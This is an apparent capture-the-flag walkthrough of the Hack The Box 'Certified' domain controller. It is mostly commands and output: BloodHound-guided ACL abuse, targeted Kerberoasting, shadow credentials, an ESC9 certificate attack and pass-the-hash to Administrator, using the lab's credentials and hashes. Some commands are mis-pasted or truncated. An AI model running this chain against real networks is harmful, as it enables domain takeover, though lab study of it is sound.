- Machine Information

As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09
# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
```bash
nmap -sV -sC -vv 10.10.11.41
nmap -sU --top-ports=10 -vv 10.10.11.41

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-16 00:20:13Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-16T00:21:33+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-14T23:07:53
| Not valid after:  2026-04-14T23:07:53
| MD5:   c464:53a6:8b27:5b70:b834:183b:3330:b350
| SHA-1: c8cd:01d6:b832:aac5:9f07:07ff:c4d7:b5ba:7130:ae15
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAMqunH3iR64OwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAeFw0yNTA0MTQyMzA3NTNa
| Fw0yNjA0MTQyMzA3NTNaMB0xGzAZBgNVBAMTEkRDMDEuY2VydGlmaWVkLmh0YjCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOVowvSKKnmfzP7j0oDHsiYv
| 3auBLxNHCA8lzR2V9UlWVnWmoYec5xDsm3D6Qt/K92oxHtuWGSCNBH41LkkM/2/x
| WbOftrDa+RAnEqJXXe15ucvw7KOTbbZngORWMPyTwb+ZvWzpdUS0z2LXV/dcswfQ
| iZrZNaBzkeC36Zztgrw/hqlXJT/rgGB00zQ0TRDbacLQLoyq32SFPqTAd/2vg6Xp
| c+jB1D0urR8f5yZ4ZK7zNEGnfWhoD/eGJRz51ubN6OLH8xiikflyOQ/0iOOvhxHe
| jT13X7kTVwFDLxBytSycVWutcdQY3HEXQpP07pXskAIrtiRWTibkVADTZ5OJIhUC
| AwEAAaOCA0cwggNDMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4A
| dAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYD
| VR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4G
| CCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFl
| AwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0Njc3OC0yNjc1
| OTc4MDkxLTM4MjAzODgyNDQtMTAwMDA+BgNVHREENzA1oB8GCSsGAQQBgjcZAaAS
| BBBTwp5mQoxFT6ExYzeAVBiughJEQzAxLmNlcnRpZmllZC5odGIwHQYDVR0OBBYE
| FGb8kdz1hQ13aFXXgl4ozGvLvVVhMB8GA1UdIwQYMBaAFOz7EkAVob3H0S47Lk1L
| csBi3yv1MIHOBgNVHR8EgcYwgcMwgcCggb2ggbqGgbdsZGFwOi8vL0NOPWNlcnRp
| ZmllZC1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWVk
| LERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xh
| c3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcUGCCsGAQUFBwEBBIG4MIG1MIGyBggr
| BgEFBQcwAoaBpWxkYXA6Ly8vQ049Y2VydGlmaWVkLURDMDEtQ0EsQ049QUlBLENO
| PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
| YXRpb24sREM9Y2VydGlmaWVkLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2Jq
| ZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOC
| AQEAFusg33mUJCWt9wwiYGvl8v8pqFOm4V+aKvUa1vC/Zwb859fVPWyICPW3sth3
| tGf6hrMucoD6yIatA7omYA2spFnGn2besVk2cywbCTSFOuVPdy60yGI9AYzv8OgR
| IACrOFzJgyQdM57wk7iM4r8EDypj6wYY//ZFjvym1qTPEj9rNvX+tVsmP1aIOkN5
| IhEN5sg75O8oIp11hwUHdm3gHPDfmyrvtsDH3Bdu07ZqGLs46HrmJe2jS6rZu3OS
| VSvW5F2HNaX1HcY3KGhSYd9Fz+bVjMW3/6qVZt0xUllTohpG/HFob72aWhw9lV5d
| OqUmXaWvDzyRBVWUe/6dYpzjrw==
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-16T00:21:34+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-14T23:07:53
| Not valid after:  2026-04-14T23:07:53
| MD5:   c464:53a6:8b27:5b70:b834:183b:3330:b350
| SHA-1: c8cd:01d6:b832:aac5:9f07:07ff:c4d7:b5ba:7130:ae15
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAMqunH3iR64OwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
<SNIP>
| IhEN5sg75O8oIp11hwUHdm3gHPDfmyrvtsDH3Bdu07ZqGLs46HrmJe2jS6rZu3OS
| VSvW5F2HNaX1HcY3KGhSYd9Fz+bVjMW3/6qVZt0xUllTohpG/HFob72aWhw9lV5d
| OqUmXaWvDzyRBVWUe/6dYpzjrw==
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-14T23:07:53
| Not valid after:  2026-04-14T23:07:53
| MD5:   c464:53a6:8b27:5b70:b834:183b:3330:b350
| SHA-1: c8cd:01d6:b832:aac5:9f07:07ff:c4d7:b5ba:7130:ae15
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAMqunH3iR64OwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
<SNIP>
| VSvW5F2HNaX1HcY3KGhSYd9Fz+bVjMW3/6qVZt0xUllTohpG/HFob72aWhw9lV5d
| OqUmXaWvDzyRBVWUe/6dYpzjrw==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-16T00:21:33+00:00; +7h00m01s from scanner time.
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-14T23:07:53
| Not valid after:  2026-04-14T23:07:53
| MD5:   c464:53a6:8b27:5b70:b834:183b:3330:b350
| SHA-1: c8cd:01d6:b832:aac5:9f07:07ff:c4d7:b5ba:7130:ae15
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAMqunH3iR64OwAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
<SNIP>
| VSvW5F2HNaX1HcY3KGhSYd9Fz+bVjMW3/6qVZt0xUllTohpG/HFob72aWhw9lV5d
| OqUmXaWvDzyRBVWUe/6dYpzjrw==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-16T00:21:34+00:00; +7h00m01s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50458/tcp): CLEAN (Timeout)
|   Check 2 (port 59527/tcp): CLEAN (Timeout)
|   Check 3 (port 12583/udp): CLEAN (Timeout)
|   Check 4 (port 30981/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-04-16T00:20:54
|_  start_date: N/A


---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127

```
- Kerberos, SMB, LDAP, SSL
- ldap server ; dc01.certified.htb
- host website server: certified.htb
- Add above 2 to /etc/hosts
## SMB Enumeration
- Passing these commands we end up finding a share:
```bash
smbclient -U 'judith.mader' --password='judith09' -L //10.10.11.41
--OR--
netexec smb 10.10.11.41 -u judith.mader -p 'judith09' --shares

---OUTPUT-1---
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.41 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

---OUTPUT-2---
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             [*] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share 
```
- only default shares
## BloodHound
- We grab the bloodhound files we need to analyze the target network:
```bash
bloodhound-python --dns-tcp -ns 10.10.11.41 -d certified.htb -u 'judith.mader' -p 'judith09' -c all
```
- We start up bloodhound and add the files:
```bash
--TERMINAL-1--
sudo neo4j console # login if needed or first entry at localhost:7474
---TERMINAL-2--
sudo bloodhound --disable-gpu # argument due to issues in running bloodhound on VM
```
- under Shortest Path to Domain Admin's we don't see a clear route but we do see a Management_SVC account which we mark as high value
- We search for our compromised user judith.mader and mark as owned (also visible in the above search)
- We check First Degree Object Control under OUTBOUND OBJECT CONTROL and see we have WriteOwner privilege i.e e can modify the owner of the management group.
- We first change the ownership of the object. (Had to change -owner to -new-owner as comapared to the bloodhound command)
```bash
impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'

---OUTPUT---
...
[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```
- Then we give ourselves privileges ( we can use FullControl instead here also but we just need Write privileges as shown in bloodhound). I had to make some small changes to the code provided
```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'

---OUTPUT---
...
[*] DACL backed up to dacledit-20250416-054658.bak
[*] DACL modified successfully!
```
- Next we add our user as a member to this group and verify it
```bash
# To add member
net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "dc01.certified.htb" 

# To verify
net rpc group members "management" -U "certified.htb"/"judith.mader"%"judith09" -S "dc01.certified.htb"

---OUTPUT-VERIFY---
CERTIFIED\judith.mader
CERTIFIED\management_svc
```
- Now we can mark the group as owned and once again check First Degree Object Control under OUTBOUND OBJECT CONTROL for Management Group
- We see we have generic write access to our high value target Management_SVC 
- Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
- We perform Targetted Kerberoast attack on our target ( we get an error initially)
```bash
sudo python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'

---OUTPUT-ERROR---
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
- We fix this by syncing our clock to target.
```bash
sudo ntpdate 10.10.11.41
```
- We pass the attack again :
```bash
sudo python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'

---OUTPUT---
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$83a4026c055ee62becae8db2e1c40518$f017096bd0ba4983705f6340656d118ef05f9669bff78272053722888085ceb9468d995854fe72c1ec78b3b625aef64d9749a720710bc9170aaf19b4713383f035e6472e032a9c3a4e6ef5def175d83938e9deab634b9b0357cae8f7b02c268511fa54f905050a4c7d668594cd5a0b786a8a12b687b33d5c1188787cbf50dc348b4ad3a012c15011c32219b772cb0a5df680ad5782f2c2f86c18dd6aa5cc003674d0b87edf03af78a046acffce0b922bdc2006d802b609deadff8d4e34e741e868e53710d1e2fa3c1c4b61b7f8663c8892bbdd7459b3e77408fcc04018cd78dac7e40bd45aea2cb013ded39ee0073c6c28cbdd8d06294c127b5ce72bc769cfe15496652c9ed59e532a7255805013f37dd804e6af55fc15b622b1bd8c814f5c3086d72e58ab612c85f94ebbca3a54b186a4906280b7a0a6193fabef7b360eb5c37f626d881f174df29f5907f4d4093bcd7fc8c5e2001bea747f01445619e2df08d964fc15fb3196b039188d143d580b2d7de71f952e379fb97537b8a36891ea584bad71fab77c0ea65d47cb5cb78b82c85019c0286a1515368c6e29ee7aebdf3118ffe92087d32a78905261254b0247982238e3a0979b66053e14270acd774bd5b88d68dd2075386633332cf2b047b142b50e55b08078f168faaddd9abbdc9f0d3f1f5bdddc4520948e27e614ce89234de75bfd7339d170b1ff26dcbd8b1f392a6b4aa7e10075d9cb706e9fdc91d7bc21f85749bf77d5d8a54bb637983b27bc93e0e3bf4cb67ad42fa2b916042f10b571ef2224972cfbe33818673dddc08ad3ba6485aec44a20f17ccb7e4bad1c6853953c5985f07331cc2fcd86bc66ff08ded22952443a9426715f740403befcbf5963d859af4ecfefe642f0a5522e19aa9c8b76a2fab22d109d5f131d57a091e63049c6b5bb7d5f9f999a169d7e4d38af903ea84b0840501b48afc10e91285b73a5211376bbec65736b2b7e6578cfc72b57e21da0c44d02bdecf002358af5820d9f56c7a1000ec3649161ee5a6b8f970b18c3bd0a69c58b522b930440d33b0a8de81509724fc4fe209030c88bc4273a20731b489975a07eff1b54d11004878b73734a795eb50b2a8eb04e3594b939c71691373ce3b93c395e0e9c01e5decedbdd5b6d5e4699ef0335621edaa5d4d30992dd68152beedb803814a30cd1e9c624d2cb8c48d3f8ae267c3e1d0edf3a251946215d4929767b7b1dd8f292bac38dd46ff6fa9d68717904297bd0cec0743a72bff39233a1ce45c9074eaeaebde062f9a2cd815ec04f597170e2460902b18bacaf69c3600f3d7a80fe2ce236e0d390cdec5d34164ae61fa18c2facbdf56321171f03f582d52e9e4829399d5bf9b3d2cacfdab28f5223e257e7a4c95a8fa53148268de679fb02398b9f47ffee9476ae257699dfad6b25f459f7e75d0cf1326f52528fe01757c016846adbc3f1953369bf84634ef8cc33b810dd18bfc1e56410f57669250b4145a8e943791d561628a0b0355d40687978793f443918874f41e4b7e5fc4a245a7e053cbad540f939e0092886e0927e2863d8b90d1c82f2ecb1d0aa010485ebc3
```
- We try to crack it with john but it fails
- We also see we can do a shadow credential attack on management_svc and attempt that instead:
```bash
sudo python3 /opt/pywhisker/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"

---OUTPUT---
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 9514b5c6-3065-bdb9-1105-30625a28dd24
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: Bui5kehn.pfx
[+] PFX exportiert nach: Bui5kehn.pfx
[i] Passwort für PFX: WwdQKefcsCs3TS2e5Kva
[+] Saved PFX (#PKCS12) certificate & key at path: Bui5kehn.pfx
[*] Must be used with password: WwdQKefcsCs3TS2e5Kva
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
- We then use PKINITtools to first generate a TGT ticket (format for commands listed in github. can use use --help in command):
- https://github.com/dirkjanm/PKINITtools
```bash
2025-04-16 13:09:18,130 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
zsh: segmentation fault  sudo python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx  -pfx-pas

---OUTPUT-ERROR---
2025-04-16 13:09:18,130 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
zsh: segmentation fault  sudo python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx  -pfx-pas
```
- on searching google I come accross an issue int heir github about this very issue which could be solved currently by passing these commands and then executing the file:
```bash
sudo su
virtualenv venv
source venv/bin/activate
pip install minikerberos
2025-04-16 13:09:18,130 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
zsh: segmentation fault  sudo python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx  -pfx-pas

---OUTPUT---
S2e5Kva management_svc.ccache
2025-04-16 13:12:48,739 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-16 13:12:48,782 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-16 13:13:09,894 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-16 13:13:09,894 minikerberos INFO     2d0c83a142d01c31acda00384ea7147bc93fdf4ab76315dc938061ca2d9ac8af
INFO:minikerberos:2d0c83a142d01c31acda00384ea7147bc93fdf4ab76315dc938061ca2d9ac8af
2025-04-16 13:13:09,897 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```
- Remember to deactivate virtual environment after completing with the `deactivate` command
- Now using PKINITtools we attempt to grab the NTHash from this TGT:
```bash
export KRB5CCNAME=management_svc.ccache
python3 getnthash.py certified.htb/management_svc -key 2d0c83a142d01c31acda00384ea7147bc93fdf4ab76315dc938061ca2d9ac8af

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295
```
- We get hash
- We pass these commands to check if credentials work:
```bash
netexec smb 10.10.11.41 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584'
netexec winrm 10.10.11.41 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584'

---OUTPUT-SMB---
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584

---OUTPUT-WINRM---
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.41     5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)
```
- We can winrm into the machine :
```bash
evil-winrm -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584' -i  10.10.11.41
```
- We geruser flag
## Lateral Movement
- Going back to bloodhound we add management_svc as an owned target and check once again for First Degree Object Control under OUTBOUND OBJECT CONTROL for management_user user.
- We see management_svc as GenericAll i.e Full Control rights on ca_operator user
- Once again we can go with TargetedKerberoast attack or Shadow Credential attack
- I tried TargetedKerberoast again but once again the hash failed to crack so I proceeded with Shadow Credential Attack
- Another way to do this is with certipy
- This makes the process much more easier as it does the whole process in one command and doens't have the minikerberos issue GETPKINITtools is currently having
```bash
certipy shadow auto -target certified.htb -dc-ip 10.10.11.41 -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -account ca_operator    #-hashes or -password if doing it for judith.mader

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '92788ccd-cc4a-ee87-c221-c28e4bf27903'
[*] Adding Key Credential with device ID '92788ccd-cc4a-ee87-c221-c28e4bf27903' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '92788ccd-cc4a-ee87-c221-c28e4bf27903' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```
- We get hash for ca_operator.
## Privilege Escalation
- (From walkthrough): We can also check the services running and we will find ADCS hinting at checking for certificate vulnerabilities:
```bash
nxc ldap certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -M
adcs
```
- On enumerating we also check for vulnerable certificates (done on each user but this is where it is relevant)
```bash
certipy find -u 'ca_operator' -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -target 10.10.11.41 -stdout -vulnerable

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```
- We see ca_operator user is vulnerable to ESC9
- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension
- Then, the `userPrincipalName` of `ca_operator` is changed to `administrator`.
```bash
certipy account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn administrator

---OUTPUT---
[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```
- The vulnerable certificate can now be requested as `ca_operator`.
```bash
certipy req -username "ca_operator@certified.htb" -hashes "b4b86f45c6018f1b664f70805f45d8f2" -target "certified.htb" -ca 'certified-DC01-CA' -template 'CertifiedAuthentication' # information for this obtained via the find command earlier

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
- Now we change back `ca_operator`'s principal name to it's original:
```bash
certipy account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn ca_operator@certified.htb

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```
- Now, authenticating with the obtained certificate will provide the `ca_operator`'s NT hash 
```bash
certipy auth -pfx administrator.pfx -domain 'certified.htb'

---OUTPUT---
[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```
- We obtain Administrator's hash
- We can now use Pass-the_hash to login as Administrator (either via winrm or psexec):
```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34 administrator@10.10.11.41

--OR--
evil-winrm -u administrator -H '0d5b49608bbce1751f708748f67e2d34' -i  10.10.11.41

---OUTPUT-PSEXEC---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.41.....
[*] Found writable share ADMIN$
[*] Uploading file zaGYAAbw.exe
